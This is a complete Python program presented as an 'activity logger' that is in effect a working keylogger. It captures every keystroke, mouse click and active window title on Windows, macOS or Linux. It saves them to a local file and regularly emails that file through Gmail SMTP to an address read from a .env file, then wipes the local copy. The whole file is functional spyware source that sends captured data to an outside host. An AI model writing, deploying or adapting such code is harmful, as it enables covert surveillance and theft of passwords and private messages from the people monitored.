from pynput import keyboard, mouse
import threading 
import time 
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
from dotenv import load_dotenv

# Platform-specific imports for window tracking
import platform
if platform.system() == "Windows":
    import win32gui
    import win32process
    import psutil
elif platform.system() == "Darwin":  # macOS
    from AppKit import NSWorkspace
elif platform.system() == "Linux":
    import subprocess

# Load environment variables from .env file
load_dotenv()

LOG_FILE = "keyfile.txt"
SEND_INTERVAL_SECONDS = int(os.getenv("SEND_INTERVAL_SECONDS", 60))

# Configuration from environment variables
sender_email = os.getenv("SENDER_EMAIL")
receiver_email = os.getenv("RECEIVER_EMAIL")
password = os.getenv("EMAIL_PASSWORD")
subject = os.getenv("EMAIL_SUBJECT", "Activity Log Report")
body = os.getenv("EMAIL_BODY", "Please find the attached activity log file.")
filename = os.getenv("LOG_FILENAME", "activityLog.txt")

# Validate required environment variables
if not all([sender_email, receiver_email, password]):
    raise ValueError("Missing required environment variables. Check your .env file!")

# Dynamic path
script_dir = os.path.dirname(os.path.abspath(__file__))
file_path = os.path.join(script_dir, LOG_FILE)

_lock = threading.Lock()
_stop_event = threading.Event()
_current_window = ""

def get_active_window():
    """Get the active window title and application name"""
    try:
        if platform.system() == "Windows":
            window = win32gui.GetForegroundWindow()
            window_title = win32gui.GetWindowText(window)
            _, pid = win32process.GetWindowThreadProcessId(window)
            try:
                process = psutil.Process(pid)
                app_name = process.name()
            except:
                app_name = "Unknown"
            return f"{app_name} - {window_title}"
        
        elif platform.system() == "Darwin":  # macOS
            active_app = NSWorkspace.sharedWorkspace().activeApplication()
            app_name = active_app['NSApplicationName']
            # Note: Getting window title on macOS requires accessibility permissions
            return app_name
        
        elif platform.system() == "Linux":
            try:
                window_id = subprocess.check_output(['xdotool', 'getactivewindow']).decode().strip()
                window_title = subprocess.check_output(['xdotool', 'getwindowname', window_id]).decode().strip()
                return window_title
            except:
                return "Unknown"
    except:
        return "Unknown"

def log_window_change():
    """Monitor and log window changes"""
    global _current_window
    while not _stop_event.is_set():
        new_window = get_active_window()
        if new_window != _current_window and new_window != "Unknown":
            _current_window = new_window
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"\n\n[{timestamp}] === WINDOW: {_current_window} ===\n"
            
            with _lock:
                with open(file_path, "a", encoding="utf-8") as f:
                    f.write(log_entry)
        
        time.sleep(0.5)  # Check every 500ms

def on_press(key):
    """Log each keypress to file"""
    try:
        k = key.char
    except AttributeError:
        k = f'[{key.name if hasattr(key, "name") else str(key)}]'
    
    with _lock:
        with open(file_path, "a", encoding="utf-8") as f:
            f.write(k)

def on_click(x, y, button, pressed):
    """Log mouse clicks with coordinates"""
    if pressed:
        timestamp = datetime.now().strftime("%H:%M:%S")
        click_info = f"\n[CLICK at ({x}, {y}) - {button} - {timestamp}]\n"
        
        with _lock:
            with open(file_path, "a", encoding="utf-8") as f:
                f.write(click_info)

def send_email():
    """Send the activity log file via email"""
    if not os.path.exists(file_path) or os.path.getsize(file_path) == 0:
        print("No logs to send yet.")
        return
    
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        with open(file_path, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header(
            'Content-Disposition',
            f'attachment; filename={filename}',
        )
        msg.attach(part)

        smtp_server = "smtp.gmail.com" 
        port = 587

        with smtplib.SMTP(smtp_server, port) as server:
            server.starttls()
            server.login(sender_email, password)
            server.send_message(msg)
        print(f"Email sent successfully! Log from: {file_path}")
        
        # Clear the log file after successful send
        with _lock:
            open(file_path, 'w').close()
            
    except Exception as e:
        print(f"Error sending email: {e}")

def email_sender_thread():
    """Thread function to send emails periodically"""
    while not _stop_event.is_set():
        _stop_event.wait(SEND_INTERVAL_SECONDS)
        if not _stop_event.is_set():
            send_email()

if __name__ == "__main__":
    print(f"Activity log file: {file_path}")
    print(f"Platform: {platform.system()}")
    
    # Check dependencies on Windows
    if platform.system() == "Windows":
        try:
            import win32gui
            import psutil
        except ImportError:
            print("\nWARNING: Missing dependencies!")
            print("Install with: pip install pywin32 psutil")
            exit(1)
    
    # Start the window monitoring thread
    window_thread = threading.Thread(target=log_window_change, daemon=True)
    window_thread.start()
    
    # Start the email sender thread
    email_thread = threading.Thread(target=email_sender_thread, daemon=True)
    email_thread.start()
    
    # Start the mouse listener
    mouse_listener = mouse.Listener(on_click=on_click)
    mouse_listener.start()
    
    # Start the keyboard listener
    print("\nActivity logger started. Press Ctrl+C to stop.")
    print("Tracking: Keystrokes, Mouse clicks, Active windows\n")
    
    try:
        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\n\nStopping activity logger...")
        _stop_event.set()
        mouse_listener.stop()
        window_thread.join(timeout=2)
        email_thread.join(timeout=2)
        print("Stopped successfully.")